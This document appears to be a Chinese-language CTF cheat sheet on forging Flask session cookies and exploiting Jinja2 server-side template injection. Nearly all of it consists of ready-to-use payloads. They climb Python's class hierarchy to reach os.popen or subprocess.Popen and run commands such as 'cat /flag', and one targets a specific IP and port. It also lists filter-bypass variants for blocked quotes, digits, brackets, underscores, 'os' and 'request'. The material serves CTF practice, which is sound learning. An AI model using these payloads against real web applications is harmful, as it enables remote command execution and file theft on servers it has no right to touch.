# flask-session
```
解密 python flask_session_cookie_manager3.py decode -s "secret_key" -c "session"

加密 python flask_session_cookie_manager3.py encode -s "secret_key" -t "data"
```
# SSTI
```

检测：{{7*7}}

__class__ 返回类型所属的对象
__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析
__base__ 返回该对象所继承的基类 
// __base__和__mro__都是用来寻找基类的 


__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 
__init__ 类的初始化方法 
-__globals__ 对包含函数全局变量的字典的引用
```

```
{%%}可以用来声明变量，当然也可以用于循环语句和条件语句。  
{{}}用于将表达式打印到模板输出  
{##}表示未包含在模板输出中的注释  
##可以有和{%%}相同的效果
```



找到父类`<type 'object'>`-->寻找子类-->找关于命令执行或者文件操作的模块

**获取字符串的类对象
```
''.__class__ 

<type 'str'>
```

**寻找基类
```
''.__class__.__mro__ 
             __base__

(<type 'str'>, <type 'basestring'>, <type 'object'>)
```

**寻找可用引用
```
''.__class__.__mro__[2].__subclasses__() 

[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
```

**找到并利用
```
type file类型(可以进行文件读取)

<class ‘site._Printer’>类型（可以进行命令执行）
<class 'os._wrap_close'>
<class 'subprocess.Popen'>


使用方法：
<class 'os._wrap_close'>.__init__.__globals__['popen']('dir').read()

<class 'subprocess.Popen'>.('ls',shell=True,stdout=-1).communicate()
```

**构造最终payload
```
初始化类
__init__

/?name={{%27%27.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('dir').read()}}

http://61.147.171.105:62525/{{config.__class__.__init__.__globals__['os'].popen('cat%20fl4g').read()}}
```

# 绕过姿势

**SSTI数字被过滤
```
可以找到其他可选用类

全角字符代替普通字符

def half2full(half):  
    full = ''  
    for ch in half:  
        if ord(ch) in range(33, 127):  
            ch = chr(ord(ch) + 0xfee0)  
        elif ord(ch) == 32:  
            ch = chr(0x3000)  
        else:  
            pass  
        full += ch  
    return full  
t=''
s="0123456789"
for i in s:
    t+='\''+half2full(i)+'\','
print(t)
```

**SSTI单双引号被过滤
```
用request请求绕过

?name={{1.__class__.__base__.__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()}}&a=ls

?name={{1.__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.b](request.args.a).read()}}&b=popen&a=cat ../flag

当request.args.a(GET)被过滤，可以用request.values.a(GET、POST)，request.cookies.a(Cookies)



用chr绕过

先用bp爆破，测试出能用chr的类
{{().__class__.__bases__[0].__subclasses__()[§0§].__init__.__globals__.__builtins__.chr}}


?name={%set+chr=[].__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.chr%}{{ config.__class__.__init__.__globals__[chr(111)%2bchr(115)].popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read() }}
```

**方括号被过滤
```
采用__getitem__()或pop()    (与方括号相同，pop有可能报错,因为会删除里面的键)



?name={{1.__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.b)(request.values.a).read()}}
&a=cat ../flag
```

**.点被过滤
```
""|attr("__class__")
相当于
"".__class__
```

**下划线被过滤
```
可以配合上例进行过滤

?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}

cookies: a=__globals__;b=ls ../


?name={{(abc|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c))(request.cookies.d).eval(request.cookies.e)}}

Cookie:a=__init__;b=__globals__;c=__getitem__;d=__builtins__;e=__import__('os').popen('cat /flag').read()
```

**OS被过滤
```
可以用.get(request.cookies.a).进行拼接
```

以下为用 `{% %}` 绕过

**{{ 被过滤
```
使用{% %}绕过，在使用print()回显


?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}
&a=__globals__
&b=os
&c=cat /flag
```

**request 被过滤**
```
?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(24)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
{%print(x.open(file).read())%}


构造po="pop"     #利用dict()|join拼接得到
{% set po=dict(po=a,p=a)|join%}
 
等效于a=(()|select|string|list).pop(24),即a等价于下划线_
{% set a=(()|select|string|list)|attr(po)(24)%}
 
构造ini="___init__"
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
 
构造glo="__globals__"
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
 
构造geti="__getitem__"
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
 
构造built="__builtins__"
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
 
调用chr()函数
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
 
构造file='/flag'
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
```

